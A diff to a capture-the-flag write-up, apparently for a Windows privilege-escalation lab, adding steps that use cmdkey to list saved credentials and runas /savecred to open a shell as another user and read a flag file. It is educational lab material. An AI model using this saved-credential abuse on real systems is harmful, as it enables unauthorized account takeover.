@@ -77,7 +77,11 @@ In the connectionString we find this including the password:
 
 ### Q.3: There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.
 The instructions tell use exactly what to do. Start with cmdkey to see for which users we have saved credentials:```cmdkey /list```
+![cdmkey list credential](images/cmdkey.png)
 
 Sure enough, we have a saved credential for mike. Now run the following command to run cmd with his credentials: 
 ```runas /savecred /user:mike.katz cmd.exe```
+It will open **cmd.exe**. In cmd, search for a file named **flag.txt** like this: ```dir C:\flag.txt /s /p``` 
+Change to that directory with: ```cd C:\Users\mike.katz\Desktop``` To list files in that directory: ```dir``` and read the text file ```type flag.txt```
+
 
